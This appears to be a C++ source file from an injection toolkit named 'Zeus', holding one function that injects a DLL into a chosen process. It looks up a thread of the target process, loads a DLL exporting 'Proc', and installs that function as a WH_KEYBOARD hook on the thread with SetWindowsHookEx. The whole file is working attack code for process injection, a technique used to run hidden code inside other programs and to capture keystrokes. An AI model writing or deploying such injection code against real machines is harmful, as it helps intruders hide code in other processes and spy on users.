/* 
* ZeusSetWindowsHookEx.cpp : Holds the mechanism
* required for dll injection using SetWindowsHook
* Method.
*
* Written By : @Ice3man
* Email : EthanTom543@gmail.com
*
* (C) Ice3man
*/

#include "Zeus.h"

/* 
* ZeusSetWindowsHookEx : Injects A Dll using
* SetWindowsHook API.
*
* Requires : A Dll with an exported function named 'Proc'
*
* @Arguments : 
*	@ProcID : Process ID to inject
*	@szDllLoc : Location of the Dll TO Inject
*
* @Return :
*	@Void
*/
int ZeusSetWindowsHookEx(int ProcID, char *szDllLoc)
{
	DWORD ThreadID;

	ThreadID = ZeusGetThreadID(ProcID);

	printf("\n[+] Thread ID In Use : %d", ThreadID);

	HMODULE hModule = LoadLibraryEx(szDllLoc, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (hModule == NULL)
	{
#ifdef _DEBUG_
		printf("\n[!] Could Not Load Library File Specified !");
#endif
		ExitProcess(1);
	}

	HOOKPROC Addr = (HOOKPROC) GetProcAddress(hModule, "Proc");
	if (Addr == NULL)
	{
#ifdef _DEBUG_
		printf("\n[!] Could Not Get Exported Proc Function !");
#endif
		ExitProcess(1);
	}

	HHOOK Handle = SetWindowsHookEx(WH_KEYBOARD, Addr, hModule, ThreadID);
	if (Handle == NULL)
	{
#ifdef _DEBUG_
		printf("\n[!] Could Not Set Hook Using SetWindowsHookEx !");
#endif
		ExitProcess(1);
	}
	printf("\n[+] Successfully Injected Using SetWindowsHookEx !");
	printf("\n[-] Press Any Enter Any Key To Remove The Hook !");
	getchar();
	UnhookWindowsHookEx(Handle);
	ExitProcess(0);
}